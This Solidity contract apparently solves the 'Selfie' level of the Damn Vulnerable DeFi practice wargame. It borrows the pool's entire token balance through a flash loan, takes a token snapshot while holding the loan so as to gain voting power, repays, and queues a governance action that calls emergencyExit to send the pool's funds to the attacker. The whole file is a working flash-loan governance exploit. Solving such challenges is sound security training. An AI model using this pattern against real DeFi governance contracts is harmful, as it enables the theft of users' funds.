// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "./DamnValuableTokenSnapshot.sol";

contract SolveSelfie is IERC3156FlashBorrower {
    SelfiePool immutable pool;
    SimpleGovernance immutable governance;
    DamnValuableTokenSnapshot immutable dvt;
    address immutable attacker;

    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableTokenSnapshot _dvt
    ) {
        pool = _pool;
        governance = _governance;
        dvt = _dvt;

        attacker = msg.sender;
    }

    function solve() external {
        // get a flash loan of DVTs
        pool.flashLoan(this, address(dvt), dvt.balanceOf(address(pool)), "");

        // queue an action to call the `emergencyExit(address)` on the pool contract with the attacker's address
        governance.queueAction(
            address(pool),
            0,
            abi.encodeCall(SelfiePool.emergencyExit, (attacker))
        );

        // after two days, call `executeAction(1)` on the governance contract
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // call snapshot() on the DVT contract
        dvt.snapshot();

        // repay the pool
        dvt.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
